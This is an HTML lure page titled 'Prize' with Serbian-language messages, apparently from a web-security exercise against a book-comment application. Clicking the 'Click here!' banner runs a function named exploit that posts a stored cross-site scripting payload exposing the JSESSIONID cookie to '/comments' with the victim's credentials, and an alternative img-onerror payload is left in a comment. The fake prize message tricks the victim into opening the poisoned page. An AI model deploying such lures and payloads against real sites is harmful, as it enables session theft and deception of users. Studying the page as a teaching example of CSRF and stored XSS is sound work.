<!DOCTYPE html>
<html>
<head>
    <title>Prize</title>
</head>

<body>

<div onclick="exploit()" style="cursor:pointer;text-align:center;">
    <img src="youwin.png" />
    <h1>Click here!</h1>
</div>
<script>
    function exploit(evt) {
        if (evt) evt.preventDefault();

        const payload = "<script>alert('JSESSIONID: ' + document.cookie)</" + "script>";
        // const payload = '<img src="x" onerror="alert(\'Your JSESSIONID: \' + (document.cookie.split(\'JSESSIONID=\')[1]||\'n/a\'))" />';

        const body = JSON.stringify({
            bookId: 1,
            comment: payload
        });

        fetch("/comments", {
            method: "POST",
            credentials: "include",
            headers: { "Content-Type": "application/json" },
            body
        })
            .then(r => {
                if (!r.ok) throw new Error("HTTP " + r.status);
                alert("Dobili ste knjigu Le Petite Prince. Za preuzimanje nagrade otvoriti Details !");
            })
            .catch(e => {
                console.error(e);
                alert("Neuspeo zahtev.");
            });
    }
    
    document.addEventListener("DOMContentLoaded", () => {
        const a = document.getElementById("trophy-link");
        if (a) a.addEventListener("click", exploit);
    });
</script>
</body>
</html>